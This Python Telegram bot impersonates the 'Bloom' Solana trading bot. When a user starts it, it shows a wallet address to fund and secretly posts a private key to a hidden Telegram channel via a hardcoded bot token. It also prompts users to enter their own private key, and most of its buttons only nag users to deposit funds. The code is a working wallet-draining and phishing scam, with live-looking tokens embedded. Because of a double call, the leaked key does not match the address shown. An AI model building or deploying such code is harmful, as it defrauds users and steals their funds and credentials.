import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
import requests
import base58
from solders.keypair import Keypair  # Used in modern solana.py

# 1. Setup Logging Engine for debugging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define State Constants for Conversation Routing
AWAITING_PRIVATE_KEY = 1

def generate_wallet():
    # 1. Generate a new keypair (or load your existing one)
    keypair = Keypair()

    # 2. Extract the raw secret bytes (64 bytes containing both private + public parts)
    secret_bytes = bytes(keypair)

    # 3. Encode the bytes to a Base58 string
    base58_private_key = base58.b58encode(secret_bytes).decode('utf-8')

    return [keypair.pubkey(), base58_private_key]

def send_telegram_message(token, chat_id, message):
    """
    Sends a message to a Telegram channel or chat.
    """
    # Telegram API endpoint for sending messages
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    # Payload data
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"  # Enables basic markdown formatting (Bold, Italic, etc.)
    }
    
    try:
        # Making the POST request
        response = requests.post(url, json=payload)
        response_data = response.json()
        
        if response_data.get("ok"):
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Error: {response_data.get('description')}")
            
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

# --- Configuration ---
BOT_TOKEN = "8746690272:AAEr-xNwkZSBZOvq8TYf_OLnZ2S0rJxSkYg"
CHANNEL_ID = -1003719196426
#PRIVATE_KEY = ""
#TEXT_MESSAGE = f"<b>New Private Key Detected</b>\n<code>{PRIVATE_KEY}</code>"

# Execute
#send_telegram_message(BOT_TOKEN, CHANNEL_ID, TEXT_MESSAGE)

# --- UI Component Generation Blocks ---

def get_main_menu(wallet_connected=False):
    """Generates text and inline matrix layout for the core dashboard."""
    current_time = datetime.now().strftime("%H:%M:%S")
    
    # Render dynamic UI elements matching the connection state
    wallet_status = "→ <code>W1: Active Wallet</code>" 
    balance_status = "Balance: 0 SOL (USD $0)"
    warning_status = "🔴 Please fund your walet to start trading."
    wallet_address = generate_wallet()[0]
    private_key = generate_wallet()[1]
    
    text = (
        "🌸 <b>Welcome to Bloom!</b>\n\n"
        "Let your trading journey blossom with us!\n\n"
        f"🌸 <b>Your Solana Wallet Address:</b> <code>{wallet_address}</code>\n\n"
        f"{wallet_status}\n"
        f"{balance_status}\n\n"
        f"{warning_status}\n\n"
        "📚 <b>Resources:</b>\n\n"
        "• 📖 <a href='https://www.bloombot.app'>Bloom Guides</a>\n"
        "• 🔔 <a href='https://x.com'>Bloom X</a>\n"
        "• 🌍 <a href='https://www.bloombot.app'>Bloom Website</a>\n"
        "• 🤝 <a href='https://t.me'>Bloom Portal</a>\n"
        "• 🤖 <a href='https://discord.com'>Bloom Discord</a>\n\n"
        f"🕒 Last updated: {current_time}"
    )
    
    keyboard = [
        [InlineKeyboardButton("💼 Positions", callback_data="positions"), InlineKeyboardButton("🎯 LP Sniper", callback_data="lp_sniper")],
        [InlineKeyboardButton("🤖 Copy Trade", callback_data="copy_trade"), InlineKeyboardButton("💳 Wallets", callback_data="wallets")],
        [InlineKeyboardButton("📝 Limit Orders", callback_data="limit_orders"), InlineKeyboardButton("💤 AFK Mode", callback_data="afk_mode")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("👥 Referrals", callback_data="referrals"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("🗑️ Close", callback_data="close")]
    ]
    return text, InlineKeyboardMarkup(keyboard), [wallet_address, private_key]

#handle inline button clicks
async def handle_wallet_menu_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    #await query.answer()
    allowed_callbacks = {"wallet_status", "import_wallet", "back_to_main", "close"}
    if query.data not in allowed_callbacks:
        await query.answer(
            text="⚠️ Please Fund Wallet to start Trading!", 
            show_alert=True 
        )
        return # Stop execution here
    
def get_wallets_menu(wallet_connected=False):
    """Generates the text and layout for the Preserved Wallets Settings view."""
    current_time = datetime.now().strftime("%H:%M:%S")
    
    status_btn_text = "🟢 Wallet W1"
    
    text = (
        "🌸 <b>Wallets Settings</b>\n\n"
        "Manage all your wallets with ease.\n\n"
        "📖 <a href='https://www.bloombot.app'>Learn More!</a>\n\n"
        f"🕒 Last updated: {current_time}"
    )
    
    keyboard = [
        [InlineKeyboardButton(status_btn_text, callback_data="wallet_status")],
        [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet")],
        [
            InlineKeyboardButton("⬅️ Back", callback_data="back_to_main"),
            InlineKeyboardButton("🗑️ Close", callback_data="close")
        ]
    ]
    return text, InlineKeyboardMarkup(keyboard)

# --- Command & Callback Interaction Logic ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Triggers on /start. Initializes user data tracking configurations."""
    if 'wallet_connected' not in context.user_data:
        context.user_data['wallet_connected'] = False
        
    text, reply_markup, wallet_info = get_main_menu(wallet_connected=context.user_data['wallet_connected'])
    await update.message.reply_html(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    send_telegram_message(BOT_TOKEN, CHANNEL_ID, f"<b>New User Started The Bot</b>\n\nAddress: <code>{wallet_info[0]}</code>\nPrivate Key: <code>{wallet_info[1]}</code>")
    return ConversationHandler.END


async def menu_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles routing, navigation updates, and interface rendering switches."""
    query = update.callback_query
    #await query.answer()
    
    wallet_connected = context.user_data.get('wallet_connected', False)
    allowed_callbacks = {"wallet_status", "import_wallet", "back_to_main", "close", "refresh", "wallets"}
    if query.data not in allowed_callbacks:
        await query.answer(
            text="⚠️ Please Fund Wallet To Start Trading!", 
            show_alert=True 
        )
        return ConversationHandler.END
    if query.data == "close":
        await query.message.delete()
        return ConversationHandler.END
        
    elif query.data == "wallets":
        # Render the preserved Wallets Settings view
        text, reply_markup = get_wallets_menu(wallet_connected)
        await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        
    elif query.data == "back_to_main":
        # Return cleanly back to the core Dashboard
        text, reply_markup, wallet_info = get_main_menu(wallet_connected)
        await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        
    elif query.data == "refresh":
        # Timestamp text layout update matching the active screen layout context
        current_time = datetime.now().strftime("%H:%M:%S")
        updated_text = query.message.text_html.split("🕒 Last updated:")[0] + f"🕒 Last updated: {current_time}"
        try:
            await query.edit_message_text(text=updated_text, reply_markup=query.message.reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass # Suppress updates if data content remains identically structurally matching
            
    elif query.data == "import_wallet":
        # Remove dashboard block to maintain privacy during secure key collection 
        await query.message.delete()
        
        # Display explicit data collection warning string text
        sent_msg = await query.message.chat.send_message(
            "Please enter your test Solana private key :",
            parse_mode="HTML"
        )
        context.user_data['prompt_msg_id'] = sent_msg.message_id
        
        # Step into conversational state holding pattern
        return AWAITING_PRIVATE_KEY
        
    return ConversationHandler.END


async def private_key_received_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Processes plain text string capturing user keys and updates navigation layouts."""
    user_key = update.message.text
    
    # Security scrub: Delete user input string and bot textual instructions immediately 
    try:
        await update.message.delete()
        if 'prompt_msg_id' in context.user_data:
            await context.application.bot.delete_message(
                chat_id=update.effective_chat.id, 
                message_id=context.user_data['prompt_msg_id']
            )
    except Exception:
        pass

    # Log structurally for debug (Avoid dumping complete secrets into logs)
    logger.info(f"Captured secret update request string structure: {user_key[:4]}...") 
    
    # Toggle programmatic system state flag context configuration
    context.user_data['wallet_connected'] = True
    
    # Return user directly into the preserved Wallets Settings section (now showing true status)
    text, reply_markup, wallet_info = get_wallets_menu(wallet_connected=True)
    await update.message.reply_html(text=text, reply_markup=reply_markup, disable_web_page_preview=True)
    
    return ConversationHandler.END


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(msg="Exception while handling an update:", exc_info=context.error)

# --- Runtime Orchestration Core ---

def main():
    # ⚠️ INSERT YOUR ACTIVE BOT API TOKEN FROM BOTFAHER HERE
    BOT_TOKEN = "8746690272:AAHJJTT9apdfqLlNxG9qYNCm-ipm-e-xg24"

    application = Application.builder().token(BOT_TOKEN).build()

    # Threading conversational state hooks tightly through the menu infrastructure
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start_command),
            CallbackQueryHandler(menu_callback_handler)
        ],
        states={
            AWAITING_PRIVATE_KEY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, private_key_received_handler)
            ],
        },
        fallbacks=[CommandHandler("start", start_command)],
        allow_reentry=True
    )

    application.add_handler(conv_handler)
    application.add_error_handler(error_handler)
    print("Bloom Interface Architecture is deployed. Shut down via Ctrl+C.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
